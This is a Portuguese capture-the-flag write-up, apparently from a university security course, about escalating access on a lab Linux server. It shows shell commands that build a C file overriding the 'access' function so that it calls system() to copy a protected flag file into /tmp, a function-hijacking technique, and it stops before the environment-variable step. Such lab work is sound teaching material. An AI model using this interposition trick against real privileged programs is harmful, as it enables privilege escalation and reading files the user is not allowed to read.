#Linux Environment CTF

Começamos por correr o comando indicado para nos conectarmos ao servidor:

```bash
$ nc ctf-fsi.fe.up.pt 4006
```
Estando conectados, utilizamos o comando ls para ver os ficheiros do diretorio e encontramos o seguinte:

![](../pictures/ctf4ls.png)

Acreditando que admin_note.txt seria uma pista, decidimos ver o que ele continha.

![](../pictures/admin_note.png)

Graças a essa dica, fomos à pasta /tmp e após tentar criar um ficheiro percebemos que esta era a unica pasta que nao é read-only.

Sendo capazes de criar ficheiros, percebemos que existe a possibilidade de  fazer o que aprendemos no SEED labs da semana 4. Voltamos entao à pasta /flag_reader e procuramos nos seus ficheiros alguma chamada a um comando Linux. Encontramos o seguinte no ficheiro
"main.c":

![](../pictures/catmain.png)

Existe uma chamada ao comando "access".

O nosso objetivo passou entao agora a ser criar um programa chamado "access" capaz de ir buscar a bandeira ao ficheiro a qual nós nao temos acesso e transferi-la para um ficheiro de texto ao qual nós tenhamos acesso.

```bash
$ cd /tmp
$ touch exploit.c
$ echo "#include <fcntl.h>" > exploit.c
$ echo "#include <stdio.h>" >> exploit.c
$ echo "#include <stdlib.h>" >> exploit.c
$ echo "#include <unistd.h>" >> exploit.c
$ echo "#include <sys/types.h>" >> exploit.c
$ echo "int access(const char *pathname, int mode){" >> exploit.c
$ echo "    system(\"/usr/bin/cat /flags/flag.txt > /tmp/result.txt\");" >> exploit.c
$ echo "    return 0;" >> exploit.c
$ echo "}" >> exploit.c
```

Os seguintes comandos criam exatamente esse programa. Mas só criando o programa nao fazemos com que o servidor corra o nosso em vez do original. Temos entao que alterar as variaveis de ambiente para que o corra.
